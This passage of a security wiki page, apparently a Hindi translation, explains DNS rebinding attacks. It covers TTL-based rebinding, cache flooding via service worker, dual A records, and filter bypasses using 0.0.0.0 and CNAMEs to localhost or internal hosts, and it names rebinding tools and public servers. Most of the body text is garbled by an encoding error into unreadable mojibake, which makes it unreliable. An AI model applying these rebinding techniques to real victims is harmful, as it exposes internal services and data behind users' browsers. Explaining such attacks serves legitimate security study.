рдЖрдк **CORS рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ рдХрд┐ `e.origin === window.origin` **рдПрдХ iframe рдмрдирд╛рдХрд░** рдФрд░ **рдЙрд╕рд╕реЗ рдПрдХ рдирдИ рд╡рд┐рдВрдбреЛ рдЦреЛрд▓рдХрд░**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding via TTL

![](<../.gitbook/assets/image (108).png>)

рдореВрд▓ рд░реВрдк рд╕реЗ рдЖрдк **рдкреАрдбрд╝рд┐рдд рдХреЛ рдЕрдкрдиреЗ рдкреГрд╖реНрда рдкрд░ рдкрд╣реБрдВрдЪрд╛рддреЗ рд╣реИрдВ**, рдлрд┐рд░ рдЖрдк рдЕрдкрдиреЗ рдбреЛрдореЗрди рдХреЗ **DNS (рдЖрдИрдкреА)** рдХреЛ рдмрджрд▓рддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ **рдкреАрдбрд╝рд┐рдд рдХреЗ рд╡реЗрдм рдкреГрд╖реНрда** рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдк рдЕрдкрдиреЗ **рдкреАрдбрд╝рд┐рдд рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ** (**JS**) рдХреБрдЫ рдЬрдм **TTL рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ** рддрд╛рдХрд┐ рдПрдХ рдирдпрд╛ DNS рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдлрд┐рд░ рдЖрдк рдЬрд╛рдирдХрд╛рд░реА рдПрдХрддреНрд░ рдХрд░ рдкрд╛рдПрдВрдЧреЗ (рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рд╣рдореЗрд╢рд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдкрдиреЗ рдбреЛрдореЗрди рдореЗрдВ рдмрдирд╛рдП рд░рдЦреЗрдВрдЧреЗ**, рд╡рд╣ **рдХреЛрдИ рдХреБрдХреА** рдкреАрдбрд╝рд┐рдд рд╕рд░реНрд╡рд░ рдХреЛ рдирд╣реАрдВ рднреЗрдЬреЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╡рд┐рдХрд▓реНрдк **рдкреАрдбрд╝рд┐рдд рдХреЗ рдЖрдИрдкреА рдХреЗ рд╡рд┐рд╢реЗрд╖ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ**).

рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рдЕрдЧрд░ рдЖрдк **TTL рдХреЛ рдмрд╣реБрдд рдХрдо** рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ (0 рдпрд╛ 1) **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдПрдХ рдХреИрд╢ рд╣реЛрддрд╛ рд╣реИ** рдЬреЛ рдЖрдкрдХреЛ **рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдиреЗ рд╕реЗ рдХрдИ рд╕реЗрдХрдВрдб/рдорд┐рдирдЯреЛрдВ рдХреЗ рд▓рд┐рдП **рд░реЛрдХреЗрдЧрд╛**.

рдЗрд╕рд▓рд┐рдП, рдпрд╣ рддрдХрдиреАрдХ **рд╕реНрдкрд╖реНрдЯ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ (рдкреАрдбрд╝рд┐рдд **рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ DNS рдЕрдиреБрд░реЛрдз рдХрд░ рд░рд╣рд╛ рд╣реИ** рдбреЛрдореЗрди рдХреЗ рдЖрдИрдкреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рдЬрдм рдмреЙрдЯ рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╡рд╣ рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ рдХрд░реЗрдЧрд╛).

рдпрд╛ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛/рдмреЙрдЯ рдПрдХ рд╣реА рдкреГрд╖реНрда рдкрд░ рд▓рдВрдмреЗ рд╕рдордп рддрдХ рд╣реЛ** (рддрд╛рдХрд┐ рдЖрдк **рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд╕рдХреЗрдВ** рдЬрдм рддрдХ рдХрд┐ **рдХреИрд╢ рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛**).

рдЕрдЧрд░ рдЖрдкрдХреЛ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рддреЗрдЬрд╝ рдЪрд╛рд╣рд┐рдП рддреЛ рдЖрдк [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) рдЬреИрд╕реА рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдЧрд░ рдЖрдк рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ DNS рд░рд┐рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╕рд░реНрд╡рд░ рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдЖрдк [**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)**,** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдлрд┐рд░ рдЕрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдкреЛрд░реНрдЯ 53/udp рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░реЗрдВ**, рдПрдХ **A рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдЗрд╕рдХреЗ рд▓рд┐рдП рдмрдирд╛рдПрдВ** (ns.example.com), рдФрд░ рдПрдХ **NS рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдмрдирд╛рдПрдВ** рдЬреЛ **рдкрд╣рд▓реЗ рдмрдирд╛рдП рдЧрдП A рд╕рдмрдбреЛрдореЗрди рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддреА рд╣реИ**(ns.example.com).\
рддрдм, рдЙрд╕ рд╕рдмрдбреЛрдореЗрди рдХрд╛ рдХреЛрдИ рднреА рд╕рдмрдбреЛрдореЗрди (ns.example.com), рдЖрдкрдХреЗ рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

[**http://rebind.it/singularity.html**](http://rebind.it/singularity.html) рдореЗрдВ **рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЪрд▓ рд░рд╣реЗ рд╕рд░реНрд╡рд░ рдХреЛ рднреА рджреЗрдЦреЗрдВ**

### DNS Rebinding via **DNS Cache Flooding**

рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, **рдмреНрд░рд╛рдЙрдЬрд╝рд░** рдбреЛрдореЗрди рдХреЗ рдЖрдИрдкреА рдХреЛ TTL рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рдордп рд╕реЗ **рдЕрдзрд┐рдХ рд╕рдордп рддрдХ рдХреИрд╢ рдХрд░рддреЗ рд╣реИрдВ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдмрдЪрд╛рд╡ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╣реИред

рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ **DNS рдХреИрд╢ рдХреЛ рдмрд╛рдврд╝ рдХрд░ рджреВрд╕рд░реЗ DNS рдЕрдиреБрд░реЛрдз рдХреЛ рдордЬрдмреВрд░ рдХрд░реЗрдЧрд╛**ред рддреЛ рдкреНрд░рд╡рд╛рд╣ рдЗрд╕ рддрд░рд╣ рд╣реЛрдЧрд╛:

1. DNS рдЕрдиреБрд░реЛрдз рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рдЙрддреНрддрд░ рджрд┐рдпрд╛ рдЧрдпрд╛
2. рд╕рд░реНрд╡рд┐рд╕ рд╡рд░реНрдХрд░ DNS рдХреИрд╢ рдХреЛ рдмрд╛рдврд╝ рджреЗрддрд╛ рд╣реИ (рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣рдорд▓рд╛рд╡рд░ рд╕рд░реНрд╡рд░ рдХрд╛ рдирд╛рдо рдорд┐рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)
3. рджреВрд╕рд░рд╛ DNS рдЕрдиреБрд░реЛрдз рдЗрд╕ рдмрд╛рд░ 127.0.0.1 рдХреЗ рд╕рд╛рде рдЙрддреНрддрд░ рджрд┐рдпрд╛ рдЧрдпрд╛

![](<../.gitbook/assets/image (375) (1).png>)

_рдиреАрд▓рд╛ рдкрд╣рд▓рд╛ DNS рдЕрдиреБрд░реЛрдз рд╣реИ рдФрд░ рдирд╛рд░рдВрдЧреА рдмрд╛рдврд╝ рд╣реИред_

### DNS Rebinding via **Cache**

рдЬреИрд╕рд╛ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, **рдмреНрд░рд╛рдЙрдЬрд╝рд░** рдбреЛрдореЗрди рдХреЗ рдЖрдИрдкреА рдХреЛ TTL рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рдордп рд╕реЗ **рдЕрдзрд┐рдХ рд╕рдордп рддрдХ рдХреИрд╢ рдХрд░рддреЗ рд╣реИрдВ**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдмрдЪрд╛рд╡ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИред

рдЖрдк **2 A рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** (рдпрд╛ **1 рдХреЛ 2 рдЖрдИрдкреА рдХреЗ рд╕рд╛рде**, рдкреНрд░рджрд╛рддрд╛ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ) **рдПрдХ рд╣реА рд╕рдмрдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП** **DNS рдкреНрд░рджрд╛рддрд╛** рдореЗрдВ рдФрд░ рдЬрдм рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЙрдиреНрд╣реЗрдВ рдЪреЗрдХ рдХрд░рддрд╛ рд╣реИ рддреЛ рд╡рд╣ рджреЛрдиреЛрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред

рдЕрдм, рдЕрдЧрд░ **рдмреНрд░рд╛рдЙрдЬрд╝рд░** рдкрд╣рд▓реЗ **рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдЖрдИрдкреА рдкрддреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд░рддрд╛ рд╣реИ**, рддреЛ **рд╣рдорд▓рд╛рд╡рд░** **рдкреЗрд▓реЛрдб рдХреЛ рд╕реЗрд╡рд╛ рджреЗрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛** рдЬреЛ **рдЙрд╕реА рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП HTTP рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдм рдЬрдм рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдкреАрдбрд╝рд┐рдд рдХрд╛ рдЖрдИрдкреА рдкрддрд╛ рдкрддрд╛ рдЪрд▓ рдЬрд╛рддрд╛ рд╣реИ, **рд╡рд╣ рдкреАрдбрд╝рд┐рдд рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдЙрддреНрддрд░ рджреЗрдирд╛ рдмрдВрдж рдХрд░ рджреЗрдЧрд╛**ред

рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдкрд╛рддрд╛ рд╣реИ рдХрд┐ **рдбреЛрдореЗрди рдЙрд╕реЗ рдЙрддреНрддрд░ рдирд╣реАрдВ рджреЗ рд░рд╣рд╛ рд╣реИ**, рддреЛ рд╡рд╣ **рджреВрд╕рд░реЗ рджрд┐рдП рдЧрдП рдЖрдИрдкреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рд╡рд╣ **SOP рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдП рдПрдХ рдЕрд▓рдЧ рдЬрдЧрд╣ рддрдХ рдкрд╣реБрдВрдЪреЗрдЧрд╛**ред рд╣рдорд▓рд╛рд╡рд░ рдЙрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ **рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ рдЙрд╕реЗ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП**ред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд▓реЛрдХрд▓рд╣реЛрд╕реНрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ Windows рдореЗрдВ **127.0.0.1** рдХреЛ рд░рд┐рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ Linux рдореЗрдВ **0.0.0.0**ред\
рдкреНрд░рджрд╛рддрд╛ рдЬреИрд╕реЗ рдХрд┐ godaddy рдпрд╛ cloudflare рдиреЗ рдореБрдЭреЗ 0.0.0.0 рдХрд╛ рдЖрдИрдкреА рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреА, рд▓реЗрдХрд┐рди AWS route53 рдиреЗ рдореБрдЭреЗ рдПрдХ A рд░рд┐рдХреЙрд░реНрдб рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд┐рд╕рдореЗрдВ 2 рдЖрдИрдкреА рд╣реЛрддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ "0.0.0.0" рд╣реЛрддрд╛ рд╣реИ

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдЖрдк [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/) рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред

### рдЕрдиреНрдп рд╕рд╛рдорд╛рдиреНрдп Bypasses

* рдЕрдЧрд░ **рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рддреЛ рд╡реЗ **0.0.0.0 рдХреЛ рдордирд╛ рдХрд░рдирд╛ рднреВрд▓ рд╕рдХрддреЗ рд╣реИрдВ** (Linux рдФрд░ Mac рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ)
* рдЕрдЧрд░ **рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ**, рддреЛ рдПрдХ **CNAME рдХрд╛ рдЙрддреНрддрд░ рджреЗрдВ** **localhost** рдХреЗ рд▓рд┐рдП (Linux рдФрд░ Mac рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ)
* рдЕрдЧрд░ **рдЖрдВрддрд░рд┐рдХ рдЖрдИрдкреА рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ** DNS рдЙрддреНрддрд░реЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ, рдЖрдк **CNAMEs рдХрд╛ рдЙрддреНрддрд░ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ** рдЖрдВрддрд░рд┐рдХ рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЬреИрд╕реЗ рдХрд┐ www.corporate.internal.

###
